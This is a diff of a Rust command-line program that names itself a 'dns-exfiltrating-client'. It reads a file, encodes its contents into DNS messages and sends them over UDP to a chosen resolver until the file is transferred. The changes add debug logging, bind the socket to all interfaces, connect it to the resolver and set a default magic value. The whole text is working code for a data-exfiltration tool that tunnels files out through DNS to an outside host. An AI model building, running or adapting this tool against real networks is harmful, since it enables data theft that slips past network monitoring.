@@ -1,6 +1,6 @@
 use std::fs;
 use std::io;
-use std::net::{UdpSocket};
+use std::net::{UdpSocket, SocketAddrV4, Ipv4Addr};
 
 use structopt::StructOpt;
 use trust_dns_proto::rr::domain::Label;
@@ -11,9 +11,12 @@ use dns_encoding::client::TransmissionState;
 use dns_encoding::encode::MessageEncoder;
 use dns_encoding::message::{Message, MessageResponse};
 
+use log::{debug, info, trace, warn};
+use std::str::FromStr;
+
 #[derive(Debug, StructOpt)]
 #[structopt(name = "dns-exfiltrating-client", about = "An client to exfiltrate files via dns.")]
-struct Opt {
+struct ClientOptions {
     file_name: String,
 
     #[structopt(short, long)]
@@ -28,7 +31,7 @@ struct Opt {
     #[structopt(long, default_value = "20")]
     slice_size: usize,
 
-    #[structopt(short, long, default_value = "")]
+    #[structopt(short, long, default_value = "8k1")]
     magic_nr: String,
 }
 
@@ -39,19 +42,23 @@ struct Encoder {
 
 impl Encoder {
     fn new(message_encoder: MessageEncoder) -> Encoder {
-        let buffer = Vec::with_capacity(1024);
+        let buffer = Vec::new();
         Encoder { message_encoder, buffer }
     }
 
     fn encode(&mut self, message: Message) {
-        self.buffer.clear();
         let dns_message = self.message_encoder.encode(message);
+        debug!("Sending dns message {:?}", dns_message);
         let mut binary_encoder = BinEncoder::new(&mut self.buffer);
         dns_message.emit(&mut binary_encoder).unwrap();
     }
 
     fn as_slice(&self) -> &[u8] {
         self.buffer.as_slice()
+    }
+
+    fn clear(&mut self) {
+        self.buffer.clear();
     }
 }
 
@@ -61,15 +68,15 @@ struct Decoder {
 
 impl Decoder {
     fn new() -> Decoder {
-        let buffer = Vec::with_capacity(1024);
+        let buffer = vec![0 as u8; 1024];
         Decoder { buffer }
     }
 
     fn decode(&mut self) -> MessageResponse {
         let mut binary_decoder = BinDecoder::new(&self.buffer);
         let server_message = trust_dns_proto::op::Message::read(&mut binary_decoder).unwrap();
+        debug!("response dns message = {:?}", server_message);
         let server_message = MessageResponse::decode(&server_message).unwrap();
-        self.buffer.clear();
         server_message
     }
 
@@ -79,8 +86,11 @@ impl Decoder {
 }
 
 fn main() -> io::Result<()> {
-    let opt: Opt = Opt::from_args();
-    println!("opt = {:?}", opt);
+    env_logger::init();
+
+    let opt: ClientOptions = ClientOptions::from_args();
+    info!("options = {:?}", opt);
+    let dns_resolver = SocketAddrV4::from_str(opt.dns_resolver.as_str()).unwrap();
 
     let contents = fs::read_to_string(&opt.file_name)?;
     let mut client_state = TransmissionState::new(opt.host,
@@ -95,23 +105,31 @@ fn main() -> io::Result<()> {
 
     let first_message = client_state.initial_message();
 
-    let socket = UdpSocket::bind("127.0.0.1:12345")?;
+    let socket = UdpSocket::bind("0.0.0.0:12345")?;
+    socket.connect(dns_resolver).expect("Failed to connect to dns-resolver");
 
+    debug!("Initial message = ${:?}", first_message);
     encoder.encode(first_message);
-    socket.send_to(encoder.as_slice(), &opt.dns_resolver)?;
+    debug!("Sending inital message to {:?}", dns_resolver);
+    socket.send(encoder.as_slice()).expect("Failed to send first message");
+    encoder.clear();
+
     loop {
+        debug!("Waiting for first response");
         let (_bytes_read, address) = socket.recv_from(&mut decoder.as_slice())?;
-        println!("recieved message from {:?}", address);
         let server_message = decoder.decode();
+        debug!("received message from {:?}: {:?}", address, server_message);
         let response = client_state.handle_response(server_message);
         match response {
             None => break,
             Some(response) => {
+                debug!("response = {:?}", response);
                 encoder.encode(response);
-                socket.send_to(&encoder.as_slice(), &opt.dns_resolver)?;
+                socket.send_to(&encoder.as_slice(), dns_resolver)?;
+                encoder.clear();
             }
         }
     }
-    println!("Finished transmission of {}", &opt.file_name);
+    info!("Finished transmission of {}", &opt.file_name);
     Ok(())
 }
